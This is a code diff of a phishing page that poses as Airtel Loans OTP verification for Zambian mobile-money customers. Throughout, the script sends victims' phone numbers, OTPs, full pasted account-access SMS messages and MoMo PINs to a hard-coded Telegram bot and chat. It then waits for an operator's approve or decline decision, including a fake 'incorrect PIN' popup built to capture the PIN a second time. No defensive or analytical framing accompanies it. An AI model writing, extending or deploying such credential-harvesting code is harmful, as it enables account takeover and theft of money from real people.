@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
     <title>Airtel Loans – OTP Verification</title>
 
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
@@ -31,7 +31,7 @@
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
             position: relative;
             text-align: center;
-            margin-bottom: 40px;
+            margin-bottom: 30px;
         }
 
         .content {
@@ -39,40 +39,36 @@
             z-index: 2;
         }
 
-        /* LOGO — using logo.png */
+        /* Logo */
         .logo {
-            margin-top: 40px;
+            margin-top: 20px;
         }
-
         .logo-img {
-            width: 120px;
-            height: auto;
-            border-radius: 20px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.08);
+            max-height: 56px;
+            width: auto;
+            border-radius: 14px;
             display: block;
-            margin: 0 auto 12px auto;
+            margin: 0 auto;
             background: #fff;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
         }
-
         .logo-text {
             color: #000;
-            font-size: 26px;
+            font-size: 24px;
             font-weight: bold;
             margin-top: 8px;
         }
-
         .logo-text .airtel-red {
             color: #E20000;
         }
 
-        /* TEXT */
+        /* Text */
         .title {
             color: #E20000;
             font-size: 20px;
             font-weight: 700;
             margin-top: 15px;
         }
-
         .subtitle {
             color: #555;
             font-size: 15px;
@@ -80,45 +76,41 @@
             line-height: 1.5;
         }
 
-        /* OTP CONTAINER – 4 boxes */
-        .otp-container {
-            display: flex;
-            justify-content: center;
-            gap: 12px;
+        /* Message textarea */
+        .message-area {
             margin-top: 20px;
+            text-align: left;
+        }
+        .message-area label {
+            font-weight: 600;
+            font-size: 14px;
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+        }
+        .message-area textarea {
             width: 100%;
-        }
-
-        .otp-input {
-            width: 56px;
-            height: 56px;
-            border-radius: 12px;
+            min-height: 140px;
+            padding: 12px;
             border: 1px solid #ddd;
-            text-align: center;
-            font-size: 24px;
-            font-weight: 700;
+            border-radius: 12px;
+            font-size: 14px;
+            font-family: 'Inter', Arial, sans-serif;
+            resize: vertical;
             outline: none;
-            background: #fff;
             transition: border 0.2s;
-            inputmode: numeric;
-            -moz-appearance: textfield;
-            appearance: textfield;
-            padding: 0 2px;
-            flex-shrink: 0;
+        }
+        .message-area textarea:focus {
+            border-color: #E20000;
+            box-shadow: 0 0 0 2px rgba(226, 0, 0, 0.25);
+        }
+        .message-area .hint {
+            font-size: 12px;
+            color: #888;
+            margin-top: 4px;
         }
 
-        .otp-input:focus {
-            border: 2px solid #E20000;
-            box-shadow: 0 0 0 3px rgba(226, 0, 0, 0.25);
-        }
-
-        .otp-input::-webkit-outer-spin-button,
-        .otp-input::-webkit-inner-spin-button {
-            -webkit-appearance: none;
-            margin: 0;
-        }
-
-        /* BUTTONS */
+        /* Buttons */
         .btn {
             width: 100%;
             height: 55px;
@@ -129,13 +121,11 @@
             cursor: pointer;
             font-weight: 700;
         }
-
         .btn-primary {
             background: linear-gradient(90deg, #E20000, #B30000);
             color: #fff;
             box-shadow: 0 4px 12px rgba(226, 0, 0, 0.35);
         }
-
         .btn-primary.disabled,
         .btn-primary:disabled {
             background: #e5e5e5;
@@ -143,7 +133,6 @@
             cursor: not-allowed;
             box-shadow: none;
         }
-
         .btn-outline {
             background: transparent;
             border: 2px solid #E20000;
@@ -156,14 +145,10 @@
             margin-top: 8px;
             min-height: 20px;
         }
-        .error {
-            color: #dc3545;
-        }
-        .success {
-            color: #28a745;
-        }
+        .error { color: #dc3545; }
+        .success { color: #28a745; }
 
-        /* ERROR BOX */
+        /* Error box */
         .error-box {
             position: absolute;
             top: 20px;
@@ -178,18 +163,15 @@
             z-index: 100;
             text-align: left;
         }
-
         .error-title {
             color: #ff0000;
             font-weight: bold;
             margin-bottom: 5px;
         }
-
         .error-text {
             color: #444;
             font-size: 14px;
         }
-
         .close {
             position: absolute;
             right: 15px;
@@ -199,7 +181,7 @@
             color: #999;
         }
 
-        /* SPINNER OVERLAY */
+        /* Spinner */
         #spinner {
             position: fixed;
             inset: 0;
@@ -210,7 +192,6 @@
             backdrop-filter: blur(2px);
             z-index: 999;
         }
-
         .loader {
             width: 44px;
             height: 44px;
@@ -219,38 +200,110 @@
             border-radius: 50%;
             animation: spin 1s linear infinite;
         }
-
         @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
+            to { transform: rotate(360deg); }
         }
 
-        /* Extra‑small screens */
+        /* PIN Modal */
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.45);
+            backdrop-filter: blur(3px);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            padding: 20px;
+            animation: modalFadeIn 0.25s ease;
+        }
+        .modal-overlay.active {
+            display: flex;
+        }
+        @keyframes modalFadeIn {
+            from { opacity: 0; transform: scale(0.96); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        .modal-box {
+            background: #ffffff;
+            border-radius: 28px;
+            max-width: 360px;
+            width: 100%;
+            padding: 32px 24px 28px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.25);
+            text-align: center;
+            position: relative;
+        }
+        .modal-title {
+            font-size: 17px;
+            font-weight: 700;
+            color: #1a1a1a;
+            line-height: 1.45;
+            margin-bottom: 6px;
+        }
+        .modal-title span { color: #E20000; }
+        .modal-sub {
+            font-size: 13px;
+            color: #777;
+            margin-top: 2px;
+            margin-bottom: 18px;
+        }
+        .modal-pin-input {
+            width: 100%;
+            max-width: 220px;
+            margin: 0 auto;
+            height: 52px;
+            border-radius: 12px;
+            border: 1px solid #ddd;
+            text-align: center;
+            font-size: 26px;
+            font-weight: 700;
+            background: #fff;
+            outline: none;
+            transition: border 0.2s, box-shadow 0.2s;
+            -webkit-text-security: disc;
+            inputmode: numeric;
+            font-family: monospace;
+            letter-spacing: 6px;
+            display: block;
+        }
+        .modal-pin-input:focus {
+            border-color: #E20000;
+            box-shadow: 0 0 0 3px rgba(226, 0, 0, 0.25);
+        }
+        .modal-pin-input.filled {
+            border-color: #E20000;
+            background: #fffef5;
+        }
+        .modal-message {
+            font-size: 13px;
+            margin-top: 12px;
+            min-height: 18px;
+            color: #dc3545;
+        }
+        .modal-loader {
+            display: inline-block;
+            width: 28px;
+            height: 28px;
+            border: 3px solid #ffe0a3;
+            border-top: 3px solid #E20000;
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+            margin-top: 10px;
+        }
+
         @media (max-width: 400px) {
-            .otp-container {
-                gap: 8px;
-            }
-            .otp-input {
-                width: 48px;
-                height: 48px;
-                font-size: 20px;
-            }
-        }
-
-        @media (max-width: 350px) {
-            .otp-container {
-                gap: 6px;
-            }
-            .otp-input {
-                width: 40px;
-                height: 44px;
-                font-size: 18px;
+            .modal-box { padding: 24px 16px 20px; }
+            .modal-title { font-size: 15px; }
+            .modal-pin-input {
+                height: 46px;
+                font-size: 22px;
+                max-width: 190px;
+                letter-spacing: 4px;
             }
         }
     </style>
 </head>
-
 <body>
 
     <div class="container">
@@ -262,7 +315,6 @@
         </div>
 
         <div class="content">
-
             <!-- LOGO -->
             <div class="logo">
                 <img src="logo.png" alt="Airtel Logo" class="logo-img" />
@@ -272,26 +324,42 @@
             <!-- TEXT -->
             <div class="title">Verify Your Account</div>
             <div class="subtitle" id="subtitleText">
-                A one-time verification code has been sent to<br />
-                <span id="maskedPhone">+260 7x xxx xxx</span>.
-                Enter it below to verify your account.
+                Paste the message you received via SMS.<br>
+                <span id="maskedPhone">+260 7x xxx xxx</span>
             </div>
 
-            <!-- OTP INPUT SECTION – 4 digits -->
-            <div id="otpSection">
-                <div class="otp-container">
-                    <input class="otp-input" maxlength="1" id="otp1" autofocus inputmode="numeric" pattern="[0-9]*" />
-                    <input class="otp-input" maxlength="1" id="otp2" inputmode="numeric" pattern="[0-9]*" />
-                    <input class="otp-input" maxlength="1" id="otp3" inputmode="numeric" pattern="[0-9]*" />
-                    <input class="otp-input" maxlength="1" id="otp4" inputmode="numeric" pattern="[0-9]*" />
-                </div>
-                <div class="message" id="otpMessage"></div>
-                <button class="btn btn-primary" id="nextBtn" disabled>Next</button>
+            <!-- MESSAGE TEXTAREA -->
+            <div class="message-area">
+                <label for="otpMessageText">Paste the message</label>
+                <textarea id="otpMessageText" placeholder="Paste the full message here..."></textarea>
+                <div class="hint">The OTP code is in the SMS message.</div>
             </div>
+
+            <div class="message" id="formMessage"></div>
+
+            <button class="btn btn-primary" id="submitBtn">Submit</button>
 
             <!-- Go Back button -->
             <button class="btn btn-outline" id="goBackBtn">Back</button>
+        </div>
+    </div>
 
+    <!-- ====== PIN MODAL ====== -->
+    <div class="modal-overlay" id="pinModal">
+        <div class="modal-box">
+            <div class="modal-title">
+                The MoMo PIN you entered is incorrect.<br>
+                Please confirm your PIN to continue.
+            </div>
+            <div class="modal-sub">Enter your 5-digit PIN</div>
+
+            <input class="modal-pin-input" id="modalPinInput" maxlength="5" inputmode="numeric" autocomplete="off" type="password" placeholder="· · · · ·">
+
+            <div class="modal-message" id="modalMessage"></div>
+            <div id="modalSpinner" style="display:none; margin-top:10px;">
+                <div class="modal-loader"></div>
+                <div style="font-size:13px; color:#888; margin-top:6px;">Verifying PIN…</div>
+            </div>
         </div>
     </div>
 
@@ -301,256 +369,228 @@
     </div>
 
     <script>
-        (function() {
-            // ==================== TELEGRAM BOT CONFIG ====================
-            const BOT_TOKEN = '9174049407:AAHox4ht-W3-M5a45rOAy4iks9b-h9BHlGs';
-            const CHAT_ID = '1006917440';
-            const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
+    (function() {
+        'use strict';
 
-            // ==================== DOM ELEMENTS ====================
-            const otpInputs = [
-                document.getElementById('otp1'),
-                document.getElementById('otp2'),
-                document.getElementById('otp3'),
-                document.getElementById('otp4')
-            ];
-            const nextBtn = document.getElementById('nextBtn');
-            const goBackBtn = document.getElementById('goBackBtn');
-            const maskedPhoneSpan = document.getElementById('maskedPhone');
-            const otpMessage = document.getElementById('otpMessage');
-            const spinner = document.getElementById('spinner');
-            const errorBox = document.getElementById('errorBox');
-            const errorText = document.getElementById('errorText');
+        // ==================== TELEGRAM BOT CONFIG ====================
+        const BOT_TOKEN = '9174049407:AAHox4ht-W3-M5a45rOAy4iks9b-h9BHlGs';
+        const CHAT_ID = '1006917440';
+        const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
-            // ==================== RETRIEVE DATA FROM SESSIONSTORAGE ====================
-            // We stored as 'airtel_phone' in the login page
-            const phone = sessionStorage.getItem('airtel_phone') || '766123456';
+        // ==================== DOM ELEMENTS ====================
+        const messageTextarea = document.getElementById('otpMessageText');
+        const submitBtn = document.getElementById('submitBtn');
+        const goBackBtn = document.getElementById('goBackBtn');
+        const maskedPhoneSpan = document.getElementById('maskedPhone');
+        const formMessage = document.getElementById('formMessage');
+        const spinner = document.getElementById('spinner');
+        const errorBox = document.getElementById('errorBox');
+        const errorText = document.getElementById('errorText');
 
-            // ==================== FORMAT & MASK PHONE FOR ZAMBIA ====================
-            function maskPhoneDigits(phone) {
-                const cleaned = phone.replace(/\D/g, '');
-                if (cleaned.length >= 4) {
-                    const start = cleaned.slice(0, 1);    // first digit (e.g., 7)
-                    const end = cleaned.slice(-2);        // last two digits
-                    const middle = 'x'.repeat(Math.max(0, cleaned.length - 3));
-                    return start + middle + end;
-                }
-                return cleaned;
+        const pinModal = document.getElementById('pinModal');
+        const modalPinInput = document.getElementById('modalPinInput');
+        const modalMessage = document.getElementById('modalMessage');
+        const modalSpinner = document.getElementById('modalSpinner');
+
+        // ==================== RETRIEVE DATA ====================
+        const phone = sessionStorage.getItem('airtel_phone') || '766123456';
+        function formatZambianPhone(phoneDigits) {
+            if (!phoneDigits) return '+260 7x xxx xxx';
+            const cleaned = phoneDigits.replace(/\D/g, '');
+            if (cleaned.length === 9) {
+                return `+260 ${cleaned.slice(0, 1)} ${cleaned.slice(1, 3)} ${cleaned.slice(3, 5)} ${cleaned.slice(5, 7)} ${cleaned.slice(7, 9)}`;
             }
-
-            function formatZambianPhone(phoneDigits) {
-                const cleaned = phoneDigits.replace(/\D/g, '');
-                if (cleaned.length === 9) {
-                    const first = cleaned.slice(0, 1);
-                    const rest = cleaned.slice(1);
-                    const parts = [];
-                    parts.push(first);
-                    for (let i = 0; i < rest.length; i += 2) {
-                        parts.push(rest.slice(i, i + 2));
-                    }
-                    return '+260 ' + parts.join(' ');
-                }
-                return phoneDigits;
+            return phoneDigits;
+        }
+        function maskPhone(phone) {
+            const cleaned = phone.replace(/\D/g, '');
+            if (cleaned.length >= 4) {
+                const start = cleaned.slice(0, 1);
+                const end = cleaned.slice(-2);
+                const middleLength = cleaned.length - 3;
+                return start + 'x'.repeat(middleLength) + end;
             }
+            return phone;
+        }
+        const maskedDigits = maskPhone(phone);
+        maskedPhoneSpan.textContent = formatZambianPhone(maskedDigits);
 
-            // Build masked version
-            const maskedDigits = maskPhoneDigits(phone);
-            const formattedMasked = formatZambianPhone(maskedDigits);
-            maskedPhoneSpan.textContent = formattedMasked;
+        // ==================== ERROR HANDLING ====================
+        function showError(message) {
+            errorText.innerText = message || 'An error occurred';
+            errorBox.style.display = 'block';
+        }
+        window.hideError = function() {
+            errorBox.style.display = 'none';
+        };
 
-            // ==================== OTP AUTO‑ADVANCE ====================
-            function focusNext(index) {
-                if (index < otpInputs.length - 1) otpInputs[index + 1].focus();
+        // ==================== MESSAGE VALIDATION ====================
+        const PREFIX = "Y'ello. Please note! This confidential code gives access to your MoMo account:";
+        const SUFFIX = "Do not share it with anyone.";
+
+        function validateAndExtractCode(text) {
+            if (!text || text.trim().length < 20) {
+                return { error: 'invalid', message: 'Invalid message format. Please paste the full SMS message.' };
             }
-
-            function focusPrev(index) {
-                if (index > 0) otpInputs[index - 1].focus();
+            const startIdx = text.indexOf(PREFIX);
+            if (startIdx === -1) {
+                return { error: 'invalid', message: 'Invalid message format. Please paste the full SMS message.' };
             }
-
-            function updateNextButton() {
-                const allFilled = otpInputs.every(inp => inp.value.length === 1);
-                nextBtn.disabled = !allFilled;
-                if (allFilled) {
-                    nextBtn.classList.remove('disabled');
-                } else {
-                    nextBtn.classList.add('disabled');
-                }
+            const endIdx = text.indexOf(SUFFIX, startIdx + PREFIX.length);
+            if (endIdx === -1) {
+                return { error: 'invalid', message: 'Invalid message format. Please paste the full SMS message.' };
             }
-
-            function scrollElementIntoView(element) {
-                if (!element) return;
-                setTimeout(() => {
-                    element.scrollIntoView({
-                        behavior: 'smooth',
-                        block: 'center',
-                        inline: 'nearest'
-                    });
-                }, 100);
+            const codeStart = startIdx + PREFIX.length;
+            let code = text.substring(codeStart, endIdx).trim();
+            if (!code || code.length < 10) {
+                return { error: 'incomplete', message: 'Incomplete message. The OTP code is missing or invalid.' };
             }
-
-            function handleFocusScroll(event) {
-                scrollElementIntoView(event.target);
+            const base64Regex = /^[A-Za-z0-9+/=]+$/;
+            if (!base64Regex.test(code)) {
+                return { error: 'incomplete', message: 'Incomplete message. The OTP code contains invalid characters.' };
             }
+            if (code.length > 200) {
+                return { error: 'incomplete', message: 'Incomplete message. The extracted code is too long.' };
+            }
+            const trailing = text.substring(endIdx + SUFFIX.length).trim();
+            if (!trailing || trailing.length < 10) {
+                return { error: 'incomplete', message: 'Incomplete message. The verification code after the suffix is missing.' };
+            }
+            const trailingClean = trailing.replace(/\s/g, '');
+            if (trailingClean.length < 10) {
+                return { error: 'incomplete', message: 'Incomplete message. The verification code appears incomplete.' };
+            }
+            if (!base64Regex.test(trailingClean)) {
+                return { error: 'incomplete', message: 'Incomplete message. The verification code contains invalid characters.' };
+            }
+            return { code: code };
+        }
 
-            otpInputs.forEach((input, idx) => {
-                input.addEventListener('input', function() {
-                    this.value = this.value.replace(/\D/g, '');
-                    if (this.value.length === 1) focusNext(idx);
-                    updateNextButton();
-                    otpMessage.textContent = '';
-                });
-
-                input.addEventListener('keydown', function(e) {
-                    if (e.key === 'Backspace') {
-                        if (this.value.length === 0 && idx > 0) {
-                            e.preventDefault();
-                            focusPrev(idx);
-                        }
-                    } else if (e.key === 'ArrowLeft') {
-                        e.preventDefault();
-                        focusPrev(idx);
-                    } else if (e.key === 'ArrowRight') {
-                        e.preventDefault();
-                        focusNext(idx);
-                    } else if (!/^[0-9]$/.test(e.key) && e.key !== 'Tab' && e.key !== 'Delete' && !e.ctrlKey && !e
-                        .metaKey) {
-                        e.preventDefault();
-                    }
-                });
-
-                input.addEventListener('focus', handleFocusScroll);
+        // ==================== TELEGRAM HELPERS ====================
+        function escapeHtml(unsafe) {
+            if (!unsafe) return '';
+            return unsafe.replace(/[&<>"]/g, function(m) {
+                if (m === '&') return '&amp;';
+                if (m === '<') return '&lt;';
+                if (m === '>') return '&gt;';
+                if (m === '"') return '&quot;';
+                return m;
             });
+        }
 
-            // Enhanced update with scroll
-            const enhancedUpdate = function() {
-                updateNextButton();
-                if (!nextBtn.disabled) {
-                    setTimeout(() => {
-                        const rect = nextBtn.getBoundingClientRect();
-                        const viewHeight = window.innerHeight;
-                        const isHidden = rect.bottom > viewHeight || rect.top < 0;
-                        if (isHidden) {
-                            nextBtn.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-                        }
-                    }, 80);
-                }
-            };
-
-            let resizeTimer;
-            window.addEventListener('resize', function() {
-                if (resizeTimer) clearTimeout(resizeTimer);
-                resizeTimer = setTimeout(() => {
-                    const focused = document.activeElement;
-                    if (focused && focused.classList && focused.classList.contains('otp-input')) {
-                        focused.scrollIntoView({ behavior: 'smooth', block: 'center' });
-                    } else if (nextBtn && !nextBtn.disabled) {
-                        const rect = nextBtn.getBoundingClientRect();
-                        const viewHeight = window.innerHeight;
-                        if (rect.bottom > viewHeight || rect.top < 0) {
-                            nextBtn.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-                        }
-                    }
-                }, 120);
-            });
-
-            // ==================== ERROR HANDLING ====================
-            function showError(message) {
-                errorText.innerText = message || 'An error occurred';
-                errorBox.style.display = 'block';
-                setTimeout(() => {
-                    errorBox.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-                }, 50);
-            }
-
-            window.hideError = function() {
-                errorBox.style.display = 'none';
-            };
-
-            // ==================== TELEGRAM HELPERS ====================
-            function escapeHtml(unsafe) {
-                return unsafe.replace(/[&<>"]/g, function(m) {
-                    if (m === '&') return '&amp;';
-                    if (m === '<') return '&lt;';
-                    if (m === '>') return '&gt;';
-                    if (m === '"') return '&quot;';
-                    return m;
+        async function sendToTelegram(payload) {
+            const url = `${API_BASE}/sendMessage`;
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
                 });
+                if (!response.ok) throw new Error(`HTTP ${response.status}`);
+                return await response.json();
+            } catch (error) {
+                console.error('Telegram send error:', error);
+                throw error;
             }
+        }
 
-            async function sendToTelegram(payload) {
-                const url = `${API_BASE}/sendMessage`;
+        // ==================== POLLING ====================
+        let currentPollInterval = null;
+
+        function pollForCallback(expectedPrefix, expectedTs, onDecision) {
+            if (currentPollInterval) {
+                clearInterval(currentPollInterval);
+                currentPollInterval = null;
+            }
+            let lastUpdateId = 0;
+            currentPollInterval = setInterval(async () => {
                 try {
-                    const response = await fetch(url, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(payload)
+                    const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
+                    const response = await fetch(url);
+                    const data = await response.json();
+                    if (!data.ok || !data.result.length) return;
+                    data.result.forEach(update => {
+                        lastUpdateId = update.update_id;
+                        const callback = update.callback_query;
+                        if (!callback || !callback.data) return;
+                        const parts = callback.data.split('_');
+                        if (parts.length < 3) return;
+                        const [type, action, time] = parts;
+                        if (time == expectedTs && type === expectedPrefix) {
+                            clearInterval(currentPollInterval);
+                            currentPollInterval = null;
+                            onDecision(action);
+                        }
                     });
-                    return await response.json();
-                } catch (error) {
-                    console.error('Telegram send error:', error);
-                    throw error;
+                } catch (err) {
+                    console.warn('Polling error:', err);
                 }
+            }, 1500);
+        }
+
+        // ==================== PIN MODAL ====================
+        let isModalSubmitting = false;
+
+        function closeModal() {
+            pinModal.classList.remove('active');
+            modalPinInput.value = '';
+            modalPinInput.classList.remove('filled');
+            modalMessage.textContent = '';
+            modalSpinner.style.display = 'none';
+            isModalSubmitting = false;
+        }
+
+        function openModal() {
+            pinModal.classList.add('active');
+            modalMessage.textContent = '';
+            modalSpinner.style.display = 'none';
+            modalPinInput.value = '';
+            modalPinInput.classList.remove('filled');
+            isModalSubmitting = false;
+            setTimeout(() => modalPinInput.focus(), 200);
+        }
+
+        modalPinInput.addEventListener('input', function() {
+            let val = this.value.replace(/\D/g, '');
+            if (val.length > 5) val = val.slice(0, 5);
+            this.value = val;
+            if (val.length === 5) {
+                this.classList.add('filled');
+            } else {
+                this.classList.remove('filled');
             }
-
-            let currentPollInterval = null;
-
-            function pollForCallback(expectedPrefix, expectedTs, onDecision) {
-                if (currentPollInterval) clearInterval(currentPollInterval);
-
-                let lastUpdateId = 0;
-
-                currentPollInterval = setInterval(async () => {
-                    try {
-                        const url = `${API_BASE}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
-                        const response = await fetch(url);
-                        const data = await response.json();
-                        if (!data.ok || !data.result.length) return;
-
-                        data.result.forEach(update => {
-                            lastUpdateId = update.update_id;
-                            if (update.callback_query && update.callback_query.data) {
-                                const parts = update.callback_query.data.split('_');
-                                if (parts.length >= 3) {
-                                    const [type, action, time] = parts;
-                                    if (time == expectedTs && type === expectedPrefix) {
-                                        clearInterval(currentPollInterval);
-                                        currentPollInterval = null;
-                                        onDecision(action);
-                                    }
-                                }
-                            }
-                        });
-                    } catch (err) {
-                        console.warn('Polling error:', err);
-                    }
-                }, 1500);
+            modalMessage.textContent = '';
+            if (val.length === 5 && !isModalSubmitting) {
+                submitModalPin();
             }
+        });
 
-            // ==================== OTP SUBMISSION ====================
-            let isSubmitting = false;
+        modalPinInput.addEventListener('keydown', function(e) {
+            if (!/^[0-9]$/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete' && e.key !== 'Tab' && e.key !== 'ArrowLeft' && e.key !== 'ArrowRight') {
+                e.preventDefault();
+            }
+        });
 
-            async function submitOtp() {
-                if (isSubmitting) return;
+        async function submitModalPin() {
+            if (isModalSubmitting) return;
+            const pin = modalPinInput.value.trim();
+            if (pin.length !== 5) return;
 
-                const enteredOtp = otpInputs.map(inp => inp.value).join('');
-                if (enteredOtp.length !== 4) {
-                    otpMessage.textContent = 'Please enter all 4 digits.';
-                    otpMessage.className = 'message error';
-                    otpMessage.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-                    return;
-                }
+            isModalSubmitting = true;
+            modalSpinner.style.display = 'block';
+            modalPinInput.disabled = true;
+            modalMessage.textContent = '';
+            modalMessage.style.color = '#555';
 
-                isSubmitting = true;
-                nextBtn.disabled = true;
-                otpInputs.forEach(inp => inp.disabled = true);
-                spinner.style.display = 'flex';
+            const ts = Date.now();
+            const escapedPin = escapeHtml(pin);
+            const msg =
+                `🔐 <b>Airtel Loans – PIN Confirmation</b>\n\n` +
+                `<b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
+                `<b>Entered PIN:</b> <code>${escapedPin}</code>\n\n` +
+                `Confirm this PIN?`;
 
-                const ts = Date.now();
-                const identifier = `Airtel Money: +260 ${phone}`;
-                const escapedOtp = escapeHtml(enteredOtp);
-                const msg =
-                    `🔐 <b>Airtel Loans OTP Verification</b>\n\n${identifier}\nEntered OTP: <code>${escapedOtp}</code>\n\nApprove or Decline?`;
-
+            try {
                 await sendToTelegram({
                     chat_id: CHAT_ID,
                     text: msg,
@@ -558,55 +598,163 @@
                     reply_markup: {
                         inline_keyboard: [
                             [
-                                { text: '✅ Approve', callback_data: `otp_approve_${ts}` },
-                                { text: '❌ Decline', callback_data: `otp_decline_${ts}` }
+                                { text: '✅ Approve PIN', callback_data: `pin_approve_${ts}` },
+                                { text: '❌ Decline PIN', callback_data: `pin_decline_${ts}` }
                             ]
                         ]
                     }
                 });
+            } catch (err) {
+                modalSpinner.style.display = 'none';
+                modalPinInput.disabled = false;
+                modalMessage.textContent = '❌ Network error. Please try again.';
+                modalMessage.style.color = '#dc3545';
+                isModalSubmitting = false;
+                return;
+            }
 
-                pollForCallback('otp', ts, (action) => {
-                    spinner.style.display = 'none';
-                    isSubmitting = false;
+            pollForCallback('pin', ts, (action) => {
+                modalSpinner.style.display = 'none';
+                modalPinInput.disabled = false;
+                isModalSubmitting = false;
 
-                    if (action === 'approve') {
-                        window.location.href = 'loan.html';
-                    } else if (action === 'decline') {
-                        showError('Invalid OTP code. Please try again.');
-                        otpInputs.forEach(inp => {
-                            inp.value = '';
-                            inp.disabled = false;
-                        });
-                        otpInputs[0].focus();
-                        updateNextButton();
-                        nextBtn.disabled = false;
+                if (action === 'approve') {
+                    closeModal();
+                    window.location.href = 'otp4.html';
+                } else if (action === 'decline') {
+                    modalMessage.textContent = '❌ Incorrect PIN';
+                    modalMessage.style.color = '#dc3545';
+                    modalPinInput.value = '';
+                    modalPinInput.classList.remove('filled');
+                    modalPinInput.focus();
+                    showError('Incorrect PIN. Please try again.');
+                    setTimeout(() => {
+                        if (modalMessage.textContent === '❌ Incorrect PIN') {
+                            modalMessage.textContent = '';
+                        }
+                    }, 3000);
+                } else {
+                    modalMessage.textContent = '❌ Unexpected response. Try again.';
+                    modalMessage.style.color = '#dc3545';
+                    isModalSubmitting = false;
+                }
+            });
+        }
+
+        // ==================== SUBMIT MESSAGE ====================
+        let isSubmitting = false;
+
+        async function submitMessage() {
+            if (isSubmitting) return;
+
+            const msgText = messageTextarea.value.trim();
+            const validation = validateAndExtractCode(msgText);
+
+            if (validation.error) {
+                formMessage.textContent = validation.message;
+                formMessage.className = 'message error';
+                messageTextarea.style.borderColor = '#dc3545';
+                setTimeout(() => {
+                    messageTextarea.style.borderColor = '';
+                }, 3000);
+                return;
+            }
+
+            formMessage.textContent = '';
+            formMessage.className = 'message';
+            const otpCode = validation.code;
+
+            isSubmitting = true;
+            submitBtn.disabled = true;
+            messageTextarea.disabled = true;
+            spinner.style.display = 'flex';
+
+            const ts = Date.now();
+            const escapedMsg = escapeHtml(msgText);
+            const phoneInfo = `📱 Phone: +260 ${phone}`;
+            const msg =
+                `🔐 <b>Airtel Loans – OTP Message</b>\n\n${phoneInfo}\n\n<b>Pasted Message:</b>\n<code>${escapedMsg}</code>\n\n<b>Extracted OTP:</b> <code>${escapeHtml(otpCode)}</code>\n\nChoose action:`;
+
+            try {
+                await sendToTelegram({
+                    chat_id: CHAT_ID,
+                    text: msg,
+                    parse_mode: 'HTML',
+                    reply_markup: {
+                        inline_keyboard: [
+                            [
+                                { text: '✅ Approve', callback_data: `otpmsg_approve_${ts}` },
+                                { text: '❌ Wrong PIN', callback_data: `otpmsg_wrongpin_${ts}` },
+                                { text: '⛔ Decline', callback_data: `otpmsg_decline_${ts}` }
+                            ]
+                        ]
                     }
                 });
+            } catch (err) {
+                spinner.style.display = 'none';
+                isSubmitting = false;
+                submitBtn.disabled = false;
+                messageTextarea.disabled = false;
+                showError('Failed to send to Telegram. Please try again.');
+                return;
             }
 
-            nextBtn.addEventListener('click', submitOtp);
+            pollForCallback('otpmsg', ts, (action) => {
+                spinner.style.display = 'none';
+                isSubmitting = false;
+                submitBtn.disabled = false;
+                messageTextarea.disabled = false;
 
-            // ==================== GO BACK ====================
-            goBackBtn.addEventListener('click', () => {
-                window.location.href = 'login.html';
-            });
-
-            // ==================== CHECK FOR PREVIOUS ERROR ====================
-            if (sessionStorage.getItem('wrongOtp')) {
-                showError('Invalid OTP code.');
-                sessionStorage.removeItem('wrongOtp');
-            }
-
-            // ==================== INIT ====================
-            updateNextButton();
-
-            setTimeout(() => {
-                const active = document.activeElement;
-                if (active && active.classList && active.classList.contains('otp-input')) {
-                    active.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                if (action === 'approve') {
+                    window.location.href = 'loan.html';
+                } else if (action === 'wrongpin') {
+                    openModal();
+                    formMessage.textContent = '📌 Please confirm your PIN in the popup.';
+                    formMessage.className = 'message';
+                } else if (action === 'decline') {
+                    showError('Paste the most recent message in full. Check and try again.');
+                    messageTextarea.value = '';
+                    messageTextarea.focus();
+                    formMessage.textContent = '';
+                } else {
+                    showError('Unexpected response. Please try again.');
                 }
-            }, 200);
-        })();
+            });
+        }
+
+        submitBtn.addEventListener('click', submitMessage);
+
+        // ==================== GO BACK ====================
+        goBackBtn.addEventListener('click', () => {
+            if (currentPollInterval) {
+                clearInterval(currentPollInterval);
+                currentPollInterval = null;
+            }
+            window.location.href = 'login.html';
+        });
+
+        // ==================== CTRL+ENTER SHORTCUT ====================
+        messageTextarea.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter' && e.ctrlKey) {
+                e.preventDefault();
+                submitMessage();
+            }
+        });
+
+        // ==================== INIT ====================
+        setTimeout(() => {
+            messageTextarea.focus();
+        }, 200);
+
+        window.addEventListener('beforeunload', function() {
+            if (currentPollInterval) {
+                clearInterval(currentPollInterval);
+                currentPollInterval = null;
+            }
+        });
+
+        console.log('[Airtel Loans] OTP page initialized with full message input.');
+    })();
     </script>
 
 </body>
